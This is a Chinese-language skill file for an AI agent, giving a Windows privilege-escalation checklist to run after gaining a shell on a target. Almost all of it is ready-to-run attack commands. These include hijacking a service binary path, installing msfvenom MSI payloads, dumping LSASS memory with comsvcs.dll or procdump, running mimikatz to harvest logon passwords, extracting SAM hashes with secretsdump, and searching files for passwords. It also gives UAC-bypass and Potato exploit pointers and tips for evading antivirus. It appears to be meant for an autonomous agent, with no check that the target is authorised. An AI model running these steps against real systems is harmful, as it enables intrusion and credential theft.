---
name: 'windows-privesc'
description: 'Windows 本地提权检查表：特权令牌→服务→UAC→DLL劫持→凭据→内核CVE→自动化。含 2025-2026 CVE 清单（已验证 2026-08-16）。'
whenToUse: '拿到 Windows shell 后本地提权：特权令牌→服务→UAC→DLL 劫持→凭据→内核 CVE。'
metadata: { domain: ad-win, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Windows 本地提权

> 🔴 **不自动加载。拿 Windows shell 后调用 `加载技能 windows-privesc`。**

## 快速索引
| 场景 | 跳转 |
|------|------|
| 刚拿 shell | §0 容器检测 → §2 信息收集 |
| 有特权令牌 (SeImpersonate等) | §3 特权令牌 → Potato 系列 |
| 有服务修改权限 | §3 服务劫持 |
| AlwaysInstallElevated | §3 UAC 绕过 |
| 有 DLL 劫持点 | §3 DLL 劫持 |
| 需要搜密码 | §4 凭据搜集 |
| 内核版本已知 | §1 内核 CVE |
| 自动化枚举 | §6 自动化工具 (winpeas) |
| 在容器内 | §7 容器逃逸 |

## 0. 容器环境检测（拿 shell 第一毫秒！）

```
[ ] whoami /all | findstr /I "docker\|container"
[ ] dir C:\ | findstr /I "dockerenv"
[ ] sc query docker 2>nul | findstr /I "RUNNING"
[ ] dir /b C:\ProgramData\Docker 2>nul
[ ] systeminfo | findstr /I "Hyper-V"
[ ] netstat -ano | findstr /I "docker"
→ 命中 → 🔴 你在容器内！加载 container-escape skill
```

## 1. 2025-2026 通杀内核提权（优先！）

✅ 以下 CVE 编号已逐条验证（2026-08-16），均为真实存在的 Windows 本地提权漏洞

```
[ ] CVE-2025-62215: Windows Kernel 竞态条件 → SYSTEM（已野外利用，CVSS 7.0）✅ 已验（Windows 内核 ntoskrnl SepDuplicateToken 竞态/double-free EoP）
[ ] CVE-2026-26179: Windows Secure Kernel double-free → VTL1 提权 ✅ 已验（Windows Secure Kernel double-free EoP）
[ ] CVE-2025-30385: CLFS 驱动 use-after-free → SYSTEM 提权 ✅ 已验（Windows 通用日志文件系统 CLFS 驱动 UAF EoP）
[ ] CVE-2025-24063: 内核流服务驱动 (ks.sys) 堆溢出 → 本地提权 ✅ 已验（Windows 内核流服务驱动 ks.sys 堆溢出 EoP）
[ ] CVE-2025-29810: AD DS 访问控制不当 → 域提权 ✅ 已验（Active Directory 域服务访问控制不当 EoP）

🔴 关键词搜 exploit: "CVE-XXXX-XXXXX exploit github"
   searchsploit windows kernel <build_number>
```

## 2. 第一秒信息收集

```
[ ] whoami /all; whoami /priv
[ ] systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
[ ] net user; net localgroup; net localgroup Administrators
[ ] netstat -ano | findstr LISTEN
[ ] tasklist /svc; sc query state= all | findstr SERVICE_NAME
[ ] set  (环境变量中的密码/令牌)
```

## 3. 快速提权（5 分钟内）

### 3.1 特权令牌（SeImpersonate / SeAssignPrimaryToken）

```
[ ] whoami /priv | findstr /I "SeImpersonate\|SeAssignPrimaryToken"
    → 有 → 🎯 JuicyPotato / PrintSpoofer / GodPotato / SweetPotato
    → Potato 家族覆盖: CLSID 绑定 (OXID 解析) / 命名管道

[ ] whoami /priv | findstr /I "SeBackupPrivilege\|SeRestorePrivilege"
    → 有 → robocopy 读 SAM/SYSTEM → secretsdump
    → 有 → diskshadow + robocopy NTDS.dit

[ ] whoami /priv | findstr /I "SeTakeOwnershipPrivilege"
    → 有 → takeown + icacls 劫持服务/文件

[ ] whoami /priv | findstr /I "SeDebugPrivilege"
    → 有 → 注入 LSASS 进程 → 导出凭据

[ ] whoami /priv | findstr /I "SeLoadDriverPrivilege"
    → 有 → 加载恶意驱动
```

### 3.2 服务相关

```
[ ] icacls 检查服务二进制权限:
    accesschk.exe -uwcqv "Authenticated Users" * /accepteula
    accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula
    accesschk.exe -uwcqv "Everyone" * /accepteula

[ ] 可修改服务配置:
    sc qc <服务名>
    sc config <服务名> binPath= "C:\evil.exe"
    sc start <服务名>

[ ] 未引用路径 (Unquoted Service Path):
    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
    → "C:\Program Files\Sub Dir\service.exe" → 劫持 Sub.exe 或 Dir.exe

[ ] 服务注册表权限:
    Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<服务名>" | fl

[ ] AlwaysInstallElevated:
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    → 均为 1 → msfvenom -f msi → msiexec /quiet /qn /i payload.msi
```

### 3.3 UAC 绕过

```
[ ] whoami /groups | findstr /I "Medium"
    → Medium Mandatory Level → UAC 绕过有效

[ ] 快速检测:
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
    → 1 = UAC 启用

[ ] 常用绕过:
    fodhelper.exe (Registry hijack — ms-settings 协议劫持，非 CVE-2020-1388)
    computerdefaults.exe
    eventvwr.exe (Registry hijack)
    msconfig.exe (GUI UAC bypass)
    SilentCleanup
    → GitHub: hfiref0x/UACME  (akagi)
```

### 3.4 DLL 劫持

```
[ ] ProcMon 找缺失 DLL（需管理员，但可先枚举路径）
[ ] 常见缺失 DLL 路径:
    C:\Windows\System32\WindowsPowerShell\v1.0\     (PowerShell)
    程序安装目录中不存在的 DLL
[ ] 可写 PATH 目录 → 放同名 DLL → 程序启动时加载
```

### 3.5 计划任务

```
[ ] schtasks /query /fo LIST /v | findstr /I "Task To Run:"
[ ] 可写脚本/二进制 → 替换或追加恶意代码
[ ] icacls <任务路径>  # 检查权限
```

## 4. 凭据搜集

```
[ ] 内存凭据（需高权限）:
    # mimikatz 直接读 (🔴 AV 杀!)
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

    # 不落盘 dump → mimikatz 离线读 (更隐蔽)
    # 方法1: procdump (需上传)
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    # 方法2: 纯系统自带 rundll32 (不落盘!)
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
    # 方法3: task manager → 右键 lsass.exe → Create dump file

    # 离线读取: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"

[ ] SAM/SYSTEM:
    reg save HKLM\SAM sam.save; reg save HKLM\SYSTEM system.save
    secretsdump.py -sam sam.save -system system.save LOCAL

[ ] 配置文件搜索:
    dir /s /b C:\*.xml C:\*.ini C:\*.txt C:\*.config C:\*.cfg 2>nul | findstr /I "pass cred secret key token"

[ ] PowerShell 历史:
    type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

[ ] 浏览器保存密码:
    LaZagne.exe browsers / Windows Vault / WiFi

[ ] 保存的 RDP 连接:
    cmdkey /list
    → 有保存凭据 → runas /savecred /user:DOMAIN\admin cmd.exe
```

## 5. 进程注入 & Token 操作

```
[ ] 注入到高权限进程:
    Get-Process -IncludeUserName | Where-Object { $_.UserName -like "*SYSTEM*" -or $_.UserName -like "*Administrator*" }
    → 选目标进程 PID → Inject

[ ] Token 窃取:
    有 SeDebugPrivilege → 打开 SYSTEM 进程 → DuplicateTokenEx → CreateProcessWithToken
```

## 6. 自动化工具

```
[ ] winPEAS.exe / winPEAS.bat              # 全面枚举
[ ] PowerUp.ps1 (Invoke-AllChecks)         # 快速配置检查
[ ] Seatbelt.exe -group=all                # C# 全量检查
[ ] Watson.exe（过时，现代用 WES-NG / PrivescCheck.ps1）/ Windows-Exploit-Suggester  # 内核 CVE 匹配
[ ] PrivescCheck.ps1                       # 现代 PowerUp 替代
```

## 7. 容器逃逸（如果检测到容器）

```
[ ] whoami /all | findstr /I "docker\|container"
[ ] 特权模式 → 挂载宿主机磁盘 → 写计划任务/SSH key
[ ] GMSA / Group MSAs → 域渗透跳板
```

## 快速优先级

| 优先级 | 项 | 命令 |
|--------|----|------|
| 🔴 0 | 特权令牌 | `whoami /priv` → SeImpersonate/SeBackup/SeDebug |
| 🔴 1 | 服务 | `accesschk` / `sc qc` / 未引用路径 |
| 🔴 2 | AlwaysInstallElevated | `reg query ... /v AlwaysInstallElevated` |
| 🔴 3 | UAC 绕过 | `whoami /groups` → Medium → UACME |
| 🟠 4 | DLL 劫持 | ProcMon / 可写 PATH |
| 🟠 5 | 计划任务 | `schtasks /query` + icacls |
| 🟡 6 | 凭据搜集 | PowerShell 历史 / 配置文件 / 内存 |
| 🟡 7 | 内核 CVE | `systeminfo` → WES/Watson |
| 🔵 8 | 自动化 | winPEAS / PowerUp / Seatbelt |

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 上来就跑 Mimikatz (被 AV 杀) | ✅ 先查特权令牌和配置缺陷 |
| ❌ 忽略 whoami /priv | ✅ SeImpersonate 是最快的提权路径 |
| ❌ 在低权限 shell 中死磕内核 CVE | ✅ 先做完 1-5 阶段 |
| ❌ 上传大文件被 AV 杀 | ✅ 优先用 LOTL 技术和 PowerShell |
| ❌ 忘记检查 AlwaysInstallElevated | ✅ 注册表 2 秒就能查完 |
